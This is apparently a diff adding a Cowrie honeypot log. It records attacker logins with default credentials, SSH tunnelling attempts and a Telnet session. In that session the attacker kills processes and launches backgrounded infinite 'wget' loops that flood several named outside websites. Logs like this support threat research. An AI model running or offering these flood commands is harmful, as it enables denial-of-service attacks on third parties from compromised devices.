@@ -4181,3 +4181,215 @@
 2017-04-11T09:04:00+0000 [HoneyPotSSHTransport,104050,58.218.199.133] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
 2017-04-11T09:04:01+0000 [HoneyPotSSHTransport,104050,58.218.199.133] NEW KEYS
 2017-04-11T09:04:01+0000 [HoneyPotSSHTransport,104050,58.218.199.133] starting service 'ssh-userauth'
+2017-04-11T09:04:02+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,104050,58.218.199.133] 'root' trying auth 'none'
+2017-04-11T09:04:04+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,104050,58.218.199.133] 'root' authenticated with 'none'
+2017-04-11T09:04:04+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,104050,58.218.199.133] starting service 'ssh-connection'
+2017-04-11T09:04:04+0000 [HoneyPotSSHTransport,104050,58.218.199.133] Got remote error, code 11
+	reason: 
+2017-04-11T09:04:04+0000 [HoneyPotSSHTransport,104050,58.218.199.133] avatar root logging out
+2017-04-11T09:04:04+0000 [HoneyPotSSHTransport,104050,58.218.199.133] connection lost
+2017-04-11T09:04:04+0000 [HoneyPotSSHTransport,104050,58.218.199.133] Connection lost after 4 seconds
+2017-04-11T09:04:07+0000 [CowrieTelnetTransport,222869,93.174.95.38] login attempt: 1941
+2017-04-11T09:04:07+0000 [CowrieTelnetTransport,222869,93.174.95.38] login return, expect: [root/admin]
+2017-04-11T09:04:10+0000 [CowrieTelnetTransport,222869,93.174.95.38] login attempt [root/admin] succeeded
+2017-04-11T09:04:11+0000 [CowrieTelnetTransport,222869,93.174.95.38] Opening TTY Log: log/tty/20170411-090411-None-222869i.log
+2017-04-11T09:04:11+0000 [CowrieTelnetTransport,222869,93.174.95.38] Warning: state changed and new state returned
+2017-04-11T09:04:11+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 190.196.145.74:59400 (10.8.41.81:2222) [session: b95b2f09]
+2017-04-11T09:04:12+0000 [HoneyPotSSHTransport,104051,190.196.145.74] Remote SSH version: SSH-2.0-libssh2_1.6.0
+2017-04-11T09:04:12+0000 [HoneyPotSSHTransport,104051,190.196.145.74] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-04-11T09:04:12+0000 [HoneyPotSSHTransport,104051,190.196.145.74] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-11T09:04:12+0000 [HoneyPotSSHTransport,104051,190.196.145.74] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-11T09:04:12+0000 [HoneyPotSSHTransport,104051,190.196.145.74] NEW KEYS
+2017-04-11T09:04:12+0000 [HoneyPotSSHTransport,104051,190.196.145.74] starting service 'ssh-userauth'
+2017-04-11T09:04:13+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,104051,190.196.145.74] 'windows' trying auth 'password'
+2017-04-11T09:04:13+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,104051,190.196.145.74] login attempt: 48
+2017-04-11T09:04:13+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,104051,190.196.145.74] login return, expect: [doctor/doctor]
+2017-04-11T09:04:15+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,104051,190.196.145.74] login attempt [windows/windows] failed
+2017-04-11T09:04:16+0000 [HoneyPotSSHTransport,104051,190.196.145.74] connection lost
+2017-04-11T09:04:16+0000 [HoneyPotSSHTransport,104051,190.196.145.74] Connection lost after 4 seconds
+2017-04-11T09:04:16+0000 [-] 'windows' failed auth 'password'
+2017-04-11T09:04:16+0000 [-] unauthorized login: 
+2017-04-11T09:04:16+0000 [twisted.internet.defer#critical] Unhandled error in Deferred:
+2017-04-11T09:04:16+0000 [twisted.internet.defer#critical] 
+	Traceback (most recent call last):
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/base.py", line 1252, in mainLoop
+	    self.runUntilCurrent()
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/base.py", line 878, in runUntilCurrent
+	    call.func(*call.args, **call.kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 459, in callback
+	    self._startRunCallbacks(result)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 567, in _startRunCallbacks
+	    self._runCallbacks()
+	--- <exception caught here> ---
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 653, in _runCallbacks
+	    current.result = callback(current.result, *args, **kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/ssh/userauth.py", line 251, in _ebBadAuth
+	    NS(b','.join(self.supportedAuthentications)) + b'\x00')
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/ssh/transport.py", line 637, in sendPacket
+	    self.transport.write(encPacket)
+	exceptions.AttributeError: 'NoneType' object has no attribute 'write'
+	
+2017-04-11T09:04:17+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,103890,91.195.103.202] got channel 'direct-tcpip' request
+2017-04-11T09:04:17+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,103890,91.195.103.202] direct-tcp connection request to 98.136.217.202:25 from localhost:5556
+2017-04-11T09:04:17+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: shell
+2017-04-11T09:04:17+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: shell
+2017-04-11T09:04:17+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: enable
+2017-04-11T09:04:17+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: enable 
+2017-04-11T09:04:17+0000 [CowrieTelnetTransport,222869,93.174.95.38] Reading txtcmd from "txtcmds/bin/enable"
+2017-04-11T09:04:17+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: system
+2017-04-11T09:04:17+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: system
+2017-04-11T09:04:17+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: sh
+2017-04-11T09:04:17+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: sh 
+2017-04-11T09:04:17+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: run
+2017-04-11T09:04:17+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: run
+2017-04-11T09:04:19+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 58.218.199.133:20780 (10.8.41.81:2222) [session: bcf3cc9b]
+2017-04-11T09:04:19+0000 [HoneyPotSSHTransport,104052,58.218.199.133] Remote SSH version: SSH-2.0-PUTTY
+2017-04-11T09:04:19+0000 [HoneyPotSSHTransport,104052,58.218.199.133] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-04-11T09:04:19+0000 [HoneyPotSSHTransport,104052,58.218.199.133] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-11T09:04:19+0000 [HoneyPotSSHTransport,104052,58.218.199.133] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-11T09:04:20+0000 [HoneyPotSSHTransport,104052,58.218.199.133] NEW KEYS
+2017-04-11T09:04:20+0000 [HoneyPotSSHTransport,104052,58.218.199.133] starting service 'ssh-userauth'
+2017-04-11T09:04:21+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,104052,58.218.199.133] 'root' trying auth 'none'
+2017-04-11T09:04:22+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,104052,58.218.199.133] 'root' authenticated with 'none'
+2017-04-11T09:04:22+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,104052,58.218.199.133] starting service 'ssh-connection'
+2017-04-11T09:04:23+0000 [HoneyPotSSHTransport,104052,58.218.199.133] Got remote error, code 11
+	reason: 
+2017-04-11T09:04:23+0000 [HoneyPotSSHTransport,104052,58.218.199.133] avatar root logging out
+2017-04-11T09:04:23+0000 [HoneyPotSSHTransport,104052,58.218.199.133] connection lost
+2017-04-11T09:04:23+0000 [HoneyPotSSHTransport,104052,58.218.199.133] Connection lost after 4 seconds
+2017-04-11T09:04:27+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: killall wget; killall ping; killall sh
+2017-04-11T09:04:27+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: killall wget
+2017-04-11T09:04:27+0000 [CowrieTelnetTransport,222869,93.174.95.38] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-04-11T09:04:27+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: killall ping
+2017-04-11T09:04:27+0000 [CowrieTelnetTransport,222869,93.174.95.38] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-04-11T09:04:27+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: killall sh
+2017-04-11T09:04:27+0000 [CowrieTelnetTransport,222869,93.174.95.38] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-04-11T09:04:37+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: shell
+2017-04-11T09:04:37+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: shell
+2017-04-11T09:04:38+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] got channel 'direct-tcpip' request
+2017-04-11T09:04:38+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] direct-tcp connection request to 146.0.234.126:8888 from localhost:5556
+2017-04-11T09:04:38+0000 [SSHChannel None (37) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] direct-tcp forward to 146.0.234.126:8888 with data 'GET /v2/callerinfo HTTP/1.1\r\nHost: 146.0.234.126:8888\r\nConnection: Keep-Alive\r\nUser-Agent: Apache-HttpClient/4.5.1 (Java/1.8.0_66)\r\nAccept-Encoding: gzip,deflate\r\n\r\n'
+2017-04-11T09:04:38+0000 [SSHChannel None (37) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] failed to connect: Connection refused
+2017-04-11T09:04:38+0000 [SSHChannel None (37) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] sending close 37
+2017-04-11T09:04:38+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] got channel 'direct-tcpip' request
+2017-04-11T09:04:38+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] direct-tcp connection request to 146.0.234.126:8888 from localhost:5556
+2017-04-11T09:04:38+0000 [SSHChannel None (38) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] direct-tcp forward to 146.0.234.126:8888 with data 'GET /v2/callerinfo HTTP/1.1\r\nHost: 146.0.234.126:8888\r\nConnection: Keep-Alive\r\nUser-Agent: Apache-HttpClient/4.5.1 (Java/1.8.0_66)\r\nAccept-Encoding: gzip,deflate\r\n\r\n'
+2017-04-11T09:04:38+0000 [SSHChannel None (38) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] failed to connect: Connection refused
+2017-04-11T09:04:38+0000 [SSHChannel None (38) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] sending close 38
+2017-04-11T09:04:38+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: enable
+2017-04-11T09:04:38+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: enable 
+2017-04-11T09:04:38+0000 [CowrieTelnetTransport,222869,93.174.95.38] Reading txtcmd from "txtcmds/bin/enable"
+2017-04-11T09:04:38+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: system
+2017-04-11T09:04:38+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: system
+2017-04-11T09:04:38+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: sh
+2017-04-11T09:04:38+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: sh 
+2017-04-11T09:04:38+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: run
+2017-04-11T09:04:38+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: run
+2017-04-11T09:04:39+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] got channel 'direct-tcpip' request
+2017-04-11T09:04:39+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] direct-tcp connection request to 146.0.234.126:8888 from localhost:5556
+2017-04-11T09:04:39+0000 [SSHChannel None (39) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] direct-tcp forward to 146.0.234.126:8888 with data 'GET /v2/callerinfo HTTP/1.1\r\nHost: 146.0.234.126:8888\r\nConnection: Keep-Alive\r\nUser-Agent: Apache-HttpClient/4.5.1 (Java/1.8.0_66)\r\nAccept-Encoding: gzip,deflate\r\n\r\n'
+2017-04-11T09:04:39+0000 [SSHChannel None (39) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] failed to connect: Connection refused
+2017-04-11T09:04:39+0000 [SSHChannel None (39) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] sending close 39
+2017-04-11T09:04:39+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] got channel 'direct-tcpip' request
+2017-04-11T09:04:39+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] direct-tcp connection request to 146.0.234.126:8888 from localhost:5556
+2017-04-11T09:04:39+0000 [SSHChannel None (40) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] direct-tcp forward to 146.0.234.126:8888 with data 'GET /v2/callerinfo HTTP/1.1\r\nHost: 146.0.234.126:8888\r\nConnection: Keep-Alive\r\nUser-Agent: Apache-HttpClient/4.5.1 (Java/1.8.0_66)\r\nAccept-Encoding: gzip,deflate\r\n\r\n'
+2017-04-11T09:04:39+0000 [SSHChannel None (40) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] failed to connect: Connection refused
+2017-04-11T09:04:39+0000 [SSHChannel None (40) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] sending close 40
+2017-04-11T09:04:40+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] got channel 'direct-tcpip' request
+2017-04-11T09:04:40+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] direct-tcp connection request to 146.0.234.126:8888 from localhost:5556
+2017-04-11T09:04:40+0000 [SSHChannel None (41) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] direct-tcp forward to 146.0.234.126:8888 with data 'GET /v2/callerinfo HTTP/1.1\r\nHost: 146.0.234.126:8888\r\nConnection: Keep-Alive\r\nUser-Agent: Apache-HttpClient/4.5.1 (Java/1.8.0_66)\r\nAccept-Encoding: gzip,deflate\r\n\r\n'
+2017-04-11T09:04:40+0000 [SSHChannel None (41) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] failed to connect: Connection refused
+2017-04-11T09:04:40+0000 [SSHChannel None (41) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103885,91.195.103.212] sending close 41
+2017-04-11T09:04:42+0000 [SSHChannel None (27) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103890,91.195.103.202] remote eof
+2017-04-11T09:04:42+0000 [SSHChannel None (27) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103890,91.195.103.202] remote close
+2017-04-11T09:04:42+0000 [SSHChannel None (27) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103890,91.195.103.202] sending close 27
+2017-04-11T09:04:42+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,103890,91.195.103.202] got channel 'direct-tcpip' request
+2017-04-11T09:04:42+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,103890,91.195.103.202] direct-tcp connection request to 98.136.217.202:25 from localhost:5556
+2017-04-11T09:04:42+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 58.218.199.133:50972 (10.8.41.81:2222) [session: 350f046f]
+2017-04-11T09:04:44+0000 [HoneyPotSSHTransport,104053,58.218.199.133] Remote SSH version: SSH-2.0-PUTTY
+2017-04-11T09:04:44+0000 [HoneyPotSSHTransport,104053,58.218.199.133] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-04-11T09:04:44+0000 [HoneyPotSSHTransport,104053,58.218.199.133] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-11T09:04:44+0000 [HoneyPotSSHTransport,104053,58.218.199.133] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-11T09:04:44+0000 [HoneyPotSSHTransport,104053,58.218.199.133] NEW KEYS
+2017-04-11T09:04:45+0000 [HoneyPotSSHTransport,104053,58.218.199.133] starting service 'ssh-userauth'
+2017-04-11T09:04:45+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,104053,58.218.199.133] 'root' trying auth 'none'
+2017-04-11T09:04:49+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,104053,58.218.199.133] 'root' authenticated with 'none'
+2017-04-11T09:04:49+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,104053,58.218.199.133] starting service 'ssh-connection'
+2017-04-11T09:04:49+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 185.145.252.26:6386 (10.8.41.81:2222) [session: 3a9d5186]
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T09:04:49+0000 [CowrieTelnetTransport,222869,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T09:04:50+0000 [HoneyPotSSHTransport,104053,58.218.199.133] Got remote error, code 11
+	reason: 
+2017-04-11T09:04:50+0000 [HoneyPotSSHTransport,104053,58.218.199.133] avatar root logging out
+2017-04-11T09:04:50+0000 [HoneyPotSSHTransport,104053,58.218.199.133] connection lost
+2017-04-11T09:04:50+0000 [HoneyPotSSHTransport,104053,58.218.199.133] Connection lost after 7 seconds
+2017-04-11T09:04:50+0000 [HoneyPotSSHTransport,104054,185.145.252.26] Remote SSH version: SSH-2.0-WinSCP_release_5.1.5
+2017-04-11T09:04:50+0000 [HoneyPotSSHTransport,104054,185.145.252.26] kex alg, key alg: 'diffie-hellman-group-exchange-sha256' 'ssh-rsa'
+2017-04-11T09:04:50+0000 [HoneyPotSSHTransport,104054,185.145.252.26] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-11T09:04:50+0000 [HoneyPotSSHTransport,104054,185.145.252.26] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-11T09:04:50+0000 [HoneyPotSSHTransport,104054,185.145.252.26] NEW KEYS
+2017-04-11T09:04:50+0000 [HoneyPotSSHTransport,104054,185.145.252.26] starting service 'ssh-userauth'
+2017-04-11T09:04:50+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,104054,185.145.252.26] 'admin' trying auth 'none'
+2017-04-11T09:04:52+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,104054,185.145.252.26] 'admin' authenticated with 'none'
+2017-04-11T09:04:52+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,104054,185.145.252.26] starting service 'ssh-connection'
